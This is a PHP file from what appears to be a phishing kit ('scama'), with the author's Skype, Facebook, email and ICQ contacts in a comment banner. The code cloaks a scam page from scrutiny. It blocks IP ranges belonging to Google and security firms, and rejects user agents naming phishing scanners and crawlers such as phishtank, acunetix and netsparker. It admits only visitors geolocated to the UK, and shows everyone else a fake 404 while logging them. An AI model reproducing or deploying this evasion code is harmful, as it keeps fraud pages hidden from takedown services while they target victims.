<?php
#####################################################################################################################
#####################################################################################################################
############################   in onder to contact me when something    #############################################
############################    happened  in scama :  skype:sowakidi    #############################################
############################    fb:http://facebook.com/ngnl9            #############################################
############################    email: shironai@gmx.com                 #############################################
############################       ICQ:666188832                        #############################################
#####################################################################################################################
#####################################################################################################################


$ips = array("^66.102.*.*", "^199.168.*.*", "^192.241.*.*", "^165.160.*.*", "^165.117.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^212.92.124.*", "^46.101.94.*", "^188.166.63.*", "^81.135.105.*", "^23.129.64.*", "^79.73.66.76");
foreach ($ips as $ip) {
    if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
        header("HTTP/1.0 404 Not Found");
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("ip-bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "
 ip : " . $ip . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "

");
        echo "<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
$dp = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocked_words = array("bot", "above", "softlayer", "amazonaws", "cyveillance", "compatible", "facebook", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "apache-httpclient", "lssrocketcrawler", "crawler", "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker", "google", "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu", "a6-indexer", "ocean", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider", "accelobot", "acoonbot", "addthis.com", "http", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "arabot", "yahoo!");
foreach ($blocked_words as $word2) {
    if (substr_count($dp, strtolower($word2)) > 0 or $dp == "" or $dp == " " or $dp == "	") {
        header("HTTP/1.0 404 Not Found");
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("host-bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "
 ip : " . $ip . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "

");
        echo "<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
};
$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {$ip = $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {$ip = $forward;}
    else
    {$ip = $remote;}
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".getenv('REMOTE_ADDR')));
    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {$countrycode = $ip_data->geoplugin_countryCode;$_SESSION['cntcode'] = $countrycode;}
;

    if ($countrycode != "UK" and $countrycode != "GB" ) {
        header("HTTP/1.0 404 Not Found");
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("cnt-bot.txt", "a");
        fwrite($file, " user-agent : " . $_SERVER['HTTP_USER_AGENT'] . "
 ip : " . $ip . " || " . $countrycode . " || " . gmdate("Y-n-d") . " ----> " . gmdate("H:i:s") . "

");
        echo "<br>";
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }


?>
